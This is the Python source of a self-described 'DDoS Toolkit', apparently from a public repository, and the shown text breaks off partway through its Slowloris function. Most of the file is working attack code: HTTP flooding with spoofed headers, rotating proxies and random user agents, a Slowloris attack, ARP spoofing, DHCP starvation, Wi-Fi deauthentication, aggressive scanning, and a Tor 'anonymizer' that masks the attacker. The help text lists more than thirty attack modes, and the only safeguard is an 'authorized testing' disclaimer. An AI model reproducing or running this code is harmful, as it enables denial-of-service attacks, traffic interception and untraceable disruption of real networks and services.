#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          ddos_toolkit
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: DDoS Toolkit
# Description:       Comprehensive toolkit for simulating various DDoS attacks for ethical cybersecurity testing, penetration testing
# and network resilience evaluation. Includes 20+ attack vectors, proxy support, performance monitoring, and detailed reporting.
# Author:            
# + LIONMAD <https://github.com/Midohajhouj>
# Version:           v.1.0
# License:           MIT License - https://opensource.org/licenses/MIT
# Dependencies:      python3 (>=3.7), aiohttp, scapy, dnspython, colorama, tqdm, psutil.
# Support:           https://github.com/Midohajhouj/DDoS-Toolkit/issues
# Security:          Requires root privileges for certain attacks
# Disclaimer:        For authorized testing only. Use responsibly.
#### END INIT INFO ####

import sys
import importlib

def check_library(lib_name):
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name)
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name} --break-system-packages")
        sys.exit(1)

# ================== Third-Party Libraries ==================
# Check for third-party libraries.
required_libraries = [
    "aiohttp", "asyncio", "argparse", "scapy.all", "dns.resolver",
    "colorama", "tqdm", "requests", "tabulate", "time", "threading",
    "concurrent.futures", "random", "json", "itertools", "collections",
    "uuid", "base64", "hashlib", "zlib", "hmac", "signal", "os",
    "subprocess", "socket", "struct", "logging", "psutil", "shutil",
    "dataclasses", "re", "ipaddress", "ssl", "urllib.parse"
]

for lib in required_libraries:
    # Handle libraries with dot notation like 'scapy.all'
    check_library(lib.split(".")[0])

# Libraries are now guaranteed to be installed. Import them.
import aiohttp  # Install module with pip aiohttp --break-system-packages
import asyncio  # Install module with pip asyncio --break-system-packages
import time  # Install module with pip time --break-system-packages
import argparse  # Install module with pip argparse --break-system-packages
import threading  # Install module with pip threading --break-system-packages
from concurrent.futures import ThreadPoolExecutor, as_completed  # Install module with pip concurrent.futures --break-system-packages
import random  # Install module with pip random --break-system-packages
import json  # Install module with pip json --break-system-packages
from itertools import cycle  # Install module with pip itertools --break-system-packages
from collections import deque  # Install module with pip collections --break-system-packages
from uuid import uuid4  # Install module with pip uuid --break-system-packages
from base64 import b64encode  # Install module with pip base64 --break-system-packages
import hashlib  # Install module with pip hashlib --break-system-packages
import zlib  # Install module with pip zlib --break-system-packages
import hmac  # Install module with pip hmac --break-system-packages
import signal  # Install module with pip signal --break-system-packages
import sys  # Install module with pip sys --break-system-packages
import os  # Install module with pip os --break-system-packages
import subprocess  # Install module with pip subprocess --break-system-packages
import socket  # Install module with pip socket --break-system-packages
import struct  # Install module with pip struct --break-system-packages
import logging  # Install module with pip logging --break-system-packages
import psutil  # Install module with pip psutil --break-system-packages
import shutil  # Install module with pip shutil --break-system-packages
import scapy.all as scapy  # Install module with pip scapy --break-system-packages
import dns.resolver  # Install module with pip dnspython --break-system-packages
from colorama import init, Fore, Style  # Install module with pip colorama --break-system-packages
from tqdm import tqdm  # Install module with pip tqdm --break-system-packages
from typing import Optional # Install module with pip typing --break-system-packages
from dataclasses import dataclass
import re
import ipaddress # Install module with pip ipadress --break-system-packages
import ssl # Install module with pip ssl --break-system-packages
from urllib.parse import urlparse
import requests  # Install module with pip requests --break-system-packages
from tabulate import tabulate  # Install module with pip tabulate --break-system-packages
from typing import List, Dict  # Already a part of typing


# Initialize colorama for colorized terminal output
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)
stop_event = threading.Event()
attack_start_time = 0

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

@dataclass
class AttackStats:
    start_time: float
    end_time: float
    requests_sent: int
    successful_requests: int
    failed_requests: int
    min_rps: float
    max_rps: float
    avg_rps: float
    cpu_usage: List[float]
    mem_usage: List[float]
    network_usage: List[int]

# Extended User-Agent list with more modern devices
USER_AGENTS = [
    # Windows 10/11 PCs - Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Windows 10/11 PCs - Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    # macOS Devices - Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    # Linux PCs - Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Android Devices - Chrome
    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    # iOS Devices - Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Smart TVs and Game Consoles
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/120.0.0.0 TV Safari/537.36",
    "Mozilla/5.0 (PlayStation 5 8.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    # Bots and Crawlers
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
]

# Supported HTTP methods
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

# Common ports for various services
SERVICE_PORTS = {
    "http": 80,
    "https": 443,
    "ftp": 21,
    "ssh": 22,
    "dns": 53,
    "ntp": 123,
    "memcached": 11211,
    "char-gen": 19,
    "quic": 443,
    "ws": 80,
    "wss": 443
}

def check_library(lib_name: str) -> None:
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name.split(".")[0])
    except ImportError:
        print(f"{RED}{lib_name} is not installed.{RESET}")
        print(f"Install it using: pip install {lib_name.split('.')[0]} --break-system-packages")
        sys.exit(1)

def display_banner() -> None:
    """Display the tool banner."""
    print(f"""
{BLUE}
███████████████████████████████████████████████████████████████████████████████████████████████████                                     
 ▄▄▄▄▄    ▄▄▄▄▄      ▄▄▄▄     ▄▄▄▄     ▄▄▄▄▄▄▄▄   ▄▄▄▄     ▄▄▄▄   ▄▄      ▄▄   ▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄         
 ██▀▀▀██  ██▀▀▀██   ██▀▀██  ▄█▀▀▀▀█    ▀▀▀██▀▀▀  ██▀▀██   ██▀▀██  ██      ██  ██▀  ▀▀██▀▀ ▀▀▀██▀▀▀ 
 ██    ██ ██    ██ ██    ██ ██▄           ██    ██    ██ ██    ██ ██      ██▄██      ██      ██    
 ██    ██ ██    ██ ██    ██  ▀████▄       ██    ██    ██ ██    ██ ██      █████      ██      ██    
 ██    ██ ██    ██ ██    ██      ▀██      ██    ██    ██ ██    ██ ██      ██  ██▄    ██      ██    
 ██▄▄▄██  ██▄▄▄██   ██▄▄██  █▄▄▄▄▄█▀      ██     ██▄▄██   ██▄▄██  ██▄▄▄▄▄ ██   ██▄ ▄▄██▄▄    ██         
 ▀▀▀▀▀    ▀▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀        ▀▀      ▀▀▀▀     ▀▀▀▀   ▀▀▀▀▀▀▀ ▀▀    ▀▀ ▀▀▀▀▀▀    ▀▀    
|U|S|E| |T|H|E| |T|O|O|L|  |A|T| |Y|O|U|R| |O|W|N| |R|I|S|K|  |L|I|O|N|M|A|D|  |S|A|L|U|T|  |Y|O|U|                                                                                        
███████████████████████████████████████████████████████████████████████████████████████████████████
{RESET}
""")

def display_help() -> None:
    """Display comprehensive help information."""
    print(f"""
{YELLOW}╔══════════════════════════════════════════════════════╗
{YELLOW}║ {BLUE}DDoS Toolkit v.1.0 - Help Information{YELLOW}     ║
{YELLOW}╚══════════════════════════════════════════════════════╝
{RESET}
{CYAN}For more info, visit our website: https://ddostoolkit.vercel.app/{RESET}
{BLUE}Usage: ddos [OPTIONS]{RESET}
  {GREEN}-u, --url URL{RESET}              Target URL or IP address (required for most attacks)
  {GREEN}-a, --attack-mode MODE{RESET}     Type of attack to perform (see below)
  {GREEN}-t, --threads NUM{RESET}          Number of threads/workers (default: 10)
  {GREEN}-d, --duration SEC{RESET}         Attack duration in seconds (default: 60)
  {GREEN}-r, --rate-limit RPS{RESET}       Rate limit per thread (default: 100)
  {GREEN}-p, --pause SEC{RESET}            Delay between requests (default: 0.1)
  {GREEN}--proxies FILE{RESET}             File containing proxy list (one per line)
  {GREEN}--results FILE{RESET}             Save attack results to JSON file
  {GREEN}-v, --version{RESET}              Show version information and exit
  {GREEN}-s, --scan{RESET}                 Perform network scan before attack
  {GREEN}--anonymizer [start|stop]{RESET}  Enable/disable anonymizer for attack
  {GREEN}--wifi-deauth{RESET}              Perform Wi-Fi deauthentication attack
  {GREEN}-i, --interactive{RESET}          Start interactive command-line interface
  {GREEN}--port PORT{RESET}                Specify target port (default based on attack)
  {GREEN}--payload-size BYTES{RESET}       Custom payload size (default: 1024)
  {GREEN}--random-ports{RESET}             Use random ports for flood attacks
  {GREEN}--tls{RESET}                      Use TLS/SSL for applicable attacks
  {GREEN}--tor{RESET}                      Route traffic through Tor network

{YELLOW}Attack Modes:{RESET}
  {CYAN}http-flood{RESET}               {CYAN}slowloris{RESET}               {CYAN}http2-flood{RESET}
  {CYAN}udp-flood{RESET}                {CYAN}syn-flood{RESET}               {CYAN}goldeneye{RESET}
  {CYAN}icmp-flood{RESET}               {CYAN}dns-amplification{RESET}       {CYAN}slow-read{RESET}
  {CYAN}ntp-amplification{RESET}        {CYAN}memcached-amplification{RESET} {CYAN}zero-byte{RESET}
  {CYAN}smurf{RESET}                    {CYAN}teardrop{RESET}                {CYAN}random-packets{RESET}
  {CYAN}ssl-flood{RESET}                {CYAN}land-attack{RESET}             {CYAN}ping-of-death{RESET}
  {CYAN}slow-post{RESET}                {CYAN}xml-bomb{RESET}                {CYAN}ntlm-auth-flood{RESET}
  {CYAN}char-gen{RESET}                 {CYAN}rst-flood{RESET}               {CYAN}ack-flood{RESET}
  {CYAN}http-fragmentation{RESET}       {CYAN}ws-dos{RESET}                  {CYAN}quic-flood{RESET}
  {CYAN}ftp-flood{RESET}                {CYAN}ssh-flood{RESET}               {CYAN}slow-flood{RESET}
  {CYAN}arp-spoofing{RESET}             {CYAN}dhcp-starvation{RESET}         {CYAN}ntp-monlist{RESET}
  {CYAN}ssdp-amplification{RESET}       {CYAN}snmp-amplification{RESET}      {CYAN}ldap-amplification{RESET}

{YELLOW}Warning:{RESET} {RED}This tool should only be used for authorized security testing.{RESET}
""")

def parse_args() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description=f"{YELLOW}DDoS Toolkit v.1.0{RESET}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )
    
    # Core attack options
    core_group = parser.add_argument_group(f"{CYAN}Core Options{RESET}")
    core_group.add_argument("-u", "--url", help="Target URL or IP address")
    core_group.add_argument("-a", "--attack-mode", 
                          choices=["http-flood", "slowloris", "udp-flood", "syn-flood", 
                                  "icmp-flood", "dns-amplification", "ftp-flood", 
                                  "ssh-flood", "ntp-amplification", "memcached-amplification", 
                                  "smurf", "teardrop", "http2-flood", "goldeneye", 
                                  "slow-read", "zero-byte", "random-packets", "ssl-flood",
                                  "land-attack", "ping-of-death", "slow-post", "xml-bomb",
                                  "ntlm-auth-flood", "char-gen", "rst-flood", "ack-flood",
                                  "http-fragmentation", "ws-dos", "quic-flood", "arp-spoofing",
                                  "dhcp-starvation", "ntp-monlist", "ssdp-amplification",
                                  "snmp-amplification", "ldap-amplification"],
                          default="http-flood",
                          help="Type of attack to perform")
    core_group.add_argument("-t", "--threads", type=int, default=10,
                          help="Number of threads/workers")
    core_group.add_argument("-r", "--rate-limit", type=int, default=100,
                          help="Rate limit per thread (requests per second)")
    core_group.add_argument("-p", "--pause", type=float, default=0.1,
                          help="Pause time between requests")
    core_group.add_argument("-d", "--duration", type=int, default=1500,
                          help="Attack duration in seconds")
    core_group.add_argument("--port", type=int, help="Specify target port")
    core_group.add_argument("--payload-size", type=int, default=1024,
                          help="Custom payload size in bytes")
    core_group.add_argument("--proxies", help="File containing proxy list")
    core_group.add_argument("--results", help="File to save results (JSON)")
    core_group.add_argument("--random-ports", action="store_true",
                          help="Use random ports for flood attacks")
    core_group.add_argument("--tls", action="store_true",
                          help="Use TLS/SSL for applicable attacks")
    core_group.add_argument("--tor", action="store_true",
                          help="Route traffic through Tor network")

    # Additional features
    feature_group = parser.add_argument_group(f"{MAGENTA}Additional Features{RESET}")
    feature_group.add_argument("-s", "--scan", action="store_true",
                             help="Perform network scan before attack")
    feature_group.add_argument("--wifi-deauth", action="store_true",
                             help="Perform Wi-Fi deauthentication attack")
    feature_group.add_argument("--anonymizer", choices=["start", "stop"],
                             help="Enable/disable anonymizer")
    feature_group.add_argument("-i", "--interactive", action="store_true",
                             help="Start interactive CLI")

    # Information options
    info_group = parser.add_argument_group(f"{GREEN}Information{RESET}")
    info_group.add_argument("-h", "--help", action="store_true",
                          help="Show this help message and exit")
    info_group.add_argument("-v", "--version", action="store_true",
                          help="Show version information and exit")

    return parser.parse_args()

def check_root() -> bool:
    """Check if script is running with root privileges."""
    return os.geteuid() == 0

def load_proxies(proxy_file: str) -> List[str]:
    """Load proxies from a text file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"{GREEN}Loaded {len(valid_proxies)} proxies.{RESET}")
        return valid_proxies
    except FileNotFoundError:
        print(f"{RED}Proxy file '{proxy_file}' not found.{RESET}")
        return []

async def validate_proxies(proxies: List[str]) -> List[str]:
    """Validate proxy servers using asyncio."""
    validated_proxies = []
    tasks = []
    
    async with aiohttp.ClientSession() as session:
        for proxy in proxies:
            task = asyncio.create_task(check_proxy(session, proxy))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for proxy, is_valid in zip(proxies, results):
            if is_valid and isinstance(is_valid, bool):
                validated_proxies.append(proxy)
    
    print(f"{GREEN}Validated {len(validated_proxies)}/{len(proxies)} proxies.{RESET}")
    return validated_proxies

async def check_proxy(session: aiohttp.ClientSession, proxy: str) -> bool:
    """Check if a proxy server is working."""
    try:
        test_urls = [
            "https://httpbin.org/ip",
            "https://www.google.com",
            "https://www.cloudflare.com"
        ]
        
        for url in test_urls:
            try:
                async with session.get(url, proxy=proxy, timeout=3) as response:
                    if response.status != 200:
                        return False
            except:
                return False
        return True
    except Exception as e:
        logger.error(f"Proxy validation error for {proxy}: {e}")
        return False

async def monitor_proxy_health(proxies: List[str]) -> None:
    """Continuously monitor proxy health and remove dead proxies."""
    while not stop_event.is_set():
        dead_proxies = []
        
        async with aiohttp.ClientSession() as session:
            tasks = [asyncio.create_task(check_proxy(session, proxy)) for proxy in proxies]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for proxy, is_alive in zip(proxies, results):
                if not is_alive or not isinstance(is_alive, bool):
                    dead_proxies.append(proxy)
        
        for dead_proxy in dead_proxies:
            if dead_proxy in proxies:
                proxies.remove(dead_proxy)
                print(f"{YELLOW}Removed unhealthy proxy: {dead_proxy}{RESET}")
        
        await asyncio.sleep(60)

def generate_payload(payload_type: str, size: int = 1024, secret_key: Optional[bytes] = None) -> Optional[bytes]:
    """Generate various types of attack payloads."""
    if secret_key is None:
        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")
    
    try:
        payload_id = str(uuid4())
        data = b64encode(os.urandom(size)).decode()
        
        payload = {
            "id": payload_id,
            "timestamp": int(time.time()),
            "data": data,
            "size": size
        }
        
        payload_str = json.dumps(payload, separators=(',', ':'))
        signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
        payload["signature"] = signature
        
        logger.debug(f"Generated signature: {signature}")

        if payload_type == "json":
            compressed_payload = compress_payload(json.dumps(payload).encode())
        elif payload_type == "xml":
            xml_payload = f"""<?xml version="1.0"?>
<data>
    <id>{payload_id}</id>
    <timestamp>{payload['timestamp']}</timestamp>
    <size>{size}</size>
    <value>{data}</value>
    <signature>{signature}</signature>
</data>"""
            compressed_payload = compress_payload(xml_payload.encode(), compression_type="gzip")
        elif payload_type == "form":
            form_data = f"id={payload_id}&data={data}&signature={signature}"
            return form_data.encode()
        else:
            logger.error(f"Invalid payload type: {payload_type}")
            return None
        
        return compressed_payload
    except Exception as e:
        logger.error(f"Error generating payload: {e}")
        return None

def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
    """Compress payload data using specified algorithm."""
    try:
        if compression_type == "gzip":
            compressed_data = gzip.compress(data)
            logger.debug(f"Compressed using gzip: {len(compressed_data)} bytes")
        else:
            compressed_data = zlib.compress(data)
            logger.debug(f"Compressed using zlib: {len(compressed_data)} bytes")
        
        return compressed_data
    except Exception as e:
        logger.error(f"Error compressing data: {e}")
        return data

def get_mac_address(ip: str) -> Optional[str]:
    """Get MAC address for a given IP using ARP."""
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        logger.error(f"Error getting MAC address: {e}")
    return None

def arp_spoof(target_ip: str, gateway_ip: str, duration: int) -> None:
    """Perform ARP spoofing attack."""
    if not check_root():
        print(f"{RED}ARP spoofing requires root privileges.{RESET}")
        return

    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print(f"{RED}Could not resolve MAC addresses.{RESET}")
        return

    print(f"{GREEN}Starting ARP spoofing attack on {target_ip} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # Send ARP replies to poison the target's ARP cache
            scapy.send(scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
            time.sleep(1)
    except Exception as e:
        logger.error(f"Error during ARP spoofing: {e}")
    finally:
        # Restore ARP tables
        scapy.send(scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=False)
        scapy.send(scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=False)
        print(f"{GREEN}ARP spoofing attack completed. ARP tables restored.{RESET}")

def dhcp_starvation(duration: int, interface: str = "eth0") -> None:
    """Perform DHCP starvation attack."""
    if not check_root():
        print(f"{RED}DHCP starvation requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting DHCP starvation attack for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # Generate random MAC and hostname
            mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
            hostname = f"host-{random.randint(1, 10000)}"
            
            # Create DHCP discover packet
            dhcp_discover = scapy.Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                          scapy.IP(src="0.0.0.0", dst="255.255.255.255") / \
                          scapy.UDP(sport=68, dport=67) / \
                          scapy.BOOTP(chaddr=mac.replace(":", "").encode()) / \
                          scapy.DHCP(options=[("message-type", "discover"), "end"])
            
            # Send packet
            scapy.sendp(dhcp_discover, iface=interface, verbose=False)
            time.sleep(0.1)
    except Exception as e:
        logger.error(f"Error during DHCP starvation: {e}")
    finally:
        print(f"{GREEN}DHCP starvation attack completed.{RESET}")

def wifi_deauth(interface: str = "wlan0", duration: int = 60) -> None:
    """Perform Wi-Fi deauthentication attack."""
    if not check_root():
        print(f"{RED}Wi-Fi deauthentication requires root privileges.{RESET}")
        return

    print(f"{GREEN}Starting Wi-Fi deauthentication attack on {interface} for {duration} seconds...{RESET}")
    start_time = time.time()
    
    try:
        # Put interface in monitor mode
        subprocess.run(["airmon-ng", "start", interface], check=True)
        monitor_iface = f"{interface}mon"
        
        while time.time() - start_time < duration and not stop_event.is_set():
            # Send deauthentication packets to broadcast
            packet = scapy.RadioTap() / \
                    scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", 
                               addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55") / \
                    scapy.Dot11Deauth()
            
            scapy.sendp(packet, iface=monitor_iface, count=10, verbose=False)
            time.sleep(1)
    except Exception as e:
        logger.error(f"Error during Wi-Fi deauthentication: {e}")
    finally:
        # Stop monitor mode
        subprocess.run(["airmon-ng", "stop", monitor_iface], check=True)
        print(f"{GREEN}Wi-Fi deauthentication attack completed.{RESET}")

def run_network_scanner(target: str) -> None:
    """Run comprehensive network scan against target."""
    if not check_root():
        print(f"{RED}Network scanning requires root privileges.{RESET}")
        return

    try:
        print(f"{GREEN}Starting comprehensive network scan on {target}...{RESET}")
        
        # Nmap scan
        nmap_cmd = ["nmap", "-sS", "-sV", "-O", "-T4", "-A", "-v", target]
        subprocess.run(nmap_cmd, check=True)
        
        # ARP scan
        print(f"\n{GREEN}Performing ARP scan...{RESET}")
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target), timeout=2, verbose=True)
        
        # Port scan
        print(f"\n{GREEN}Performing TCP port scan...{RESET}")
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389]
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        print(f"Open ports: {open_ports}")
        
        print(f"\n{GREEN}Network scan completed.{RESET}")
    except Exception as e:
        logger.error(f"Error during network scan: {e}")

def run_anonymizer(mode: str) -> None:
    """Run anonymizer script to mask network traffic."""
    if not check_root():
        print(f"{RED}Anonymizer requires root privileges.{RESET}")
        return

    try:
        if mode == "start":
            print(f"{GREEN}Starting anonymizer (Tor + Proxychains)...{RESET}")
            # Start Tor service
            subprocess.run(["service", "tor", "start"], check=True)
            # Configure proxychains
            with open("/etc/proxychains.conf", "a") as f:
                f.write("\nsocks5 127.0.0.1 9050\n")
            print(f"{GREEN}Anonymizer started successfully.{RESET}")
        elif mode == "stop":
            print(f"{GREEN}Stopping anonymizer...{RESET}")
            # Stop Tor service
            subprocess.run(["service", "tor", "stop"], check=True)
            # Restore proxychains config
            subprocess.run(["cp", "/etc/proxychains.conf.bak", "/etc/proxychains.conf"], check=True)
            print(f"{GREEN}Anonymizer stopped successfully.{RESET}")
    except Exception as e:
        logger.error(f"Error during anonymizer operation: {e}")

async def resolve_target(target_url: str) -> Optional[str]:
    """Resolve domain name to IP address with caching."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0].split(":")[0]
        
        if is_valid_ip(domain_or_ip):
            print(f"{GREEN}Target is an IP address: {domain_or_ip}{RESET}")
            return domain_or_ip
        
        # Check if we have a cached resolution
        cache_file = "/tmp/ddos_toolkit_dns_cache.json"
        dns_cache = {}
        
        if os.path.exists(cache_file):
            with open(cache_file, "r") as f:
                dns_cache = json.load(f)
                
        if domain_or_ip in dns_cache:
            if time.time() - dns_cache[domain_or_ip]["timestamp"] < 3600:  # 1 hour cache
                print(f"{GREEN}Using cached DNS resolution for {domain_or_ip}: {dns_cache[domain_or_ip]['ip']}{RESET}")
                return dns_cache[domain_or_ip]["ip"]
        
        # Perform fresh DNS resolution
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']  # Google, Cloudflare, Quad9
        answer = resolver.resolve(domain_or_ip, "A")
        ip = answer[0].to_text()
        
        # Update cache
        dns_cache[domain_or_ip] = {
            "ip": ip,
            "timestamp": time.time()
        }
        
        with open(cache_file, "w") as f:
            json.dump(dns_cache, f)
        
        print(f"{GREEN}Resolved {domain_or_ip} to IP: {ip}{RESET}")
        return ip
    except Exception as e:
        logger.error(f"Failed to resolve domain: {e}")
        return None

def is_valid_ip(ip: str) -> bool:
    """Check if string is a valid IP address."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

async def rate_limited_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                             rate_limit: int, proxies: Optional[List[str]] = None, 
                             headers: Optional[Dict[str, str]] = None, payload_type: str = "json", 
                             retry: int = 3, payload_size: int = 1024) -> None:
    """Perform rate-limited HTTP flood attack with improved error handling."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {
                            "User-Agent": random.choice(USER_AGENTS),
                            "Accept": "*/*",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Accept-Encoding": "gzip, deflate, br",
                            "Connection": "keep-alive",
                            "Cache-Control": "no-cache"
                        }
                        
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type, payload_size) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        
                        # Randomize headers slightly
                        headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                        headers["X-Request-ID"] = str(uuid4())
                        
                        async with session.request(
                            method, target_url, 
                            headers=headers, 
                            proxy=proxy, 
                            data=payload, 
                            timeout=aiohttp.ClientTimeout(total=5),
                            ssl=ssl.SSLContext()
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                            # Read response to complete the request
                            await response.read()
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logger.debug(f"Client error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logger.debug(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                await asyncio.sleep(pause_time)

async def slowloris_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                          rate_limit: int, proxies: Optional[List[str]] = None, 
                          headers: Optional[Dict[str, str]] = None, retry: int = 3) -> None:
    """Perform Slowloris attack with improved connection management."""
    global requests_sent, successful_requests, failed_requests
    
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = headers or {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        proxy = next(proxy_pool) if proxy_pool else None
                        
                        # Create a session but don't complete the request
                        timeout = aiohttp.ClientTimeout(total=30)
                        connector = aiohttp.TCPConnector(force_close=True)
                        
                        async with aiohttp.ClientSession(connector=connector) as slow_session:
                            async with slow_session.get(
                                target_url,
                                headers=headers,
                                proxy=proxy,
                                timeout=timeout
                            ) as response:
                                with requests_lock:
                                    requests_sent += 1
                                    if response.status in [200, 201, 204]:
                                        successful_requests += 1
                                    else:
                                        failed_requests += 1
                                
                                # Keep the connection open
                                await asyncio.sleep(10)
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logger.debug(f"Client error during Slowloris (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
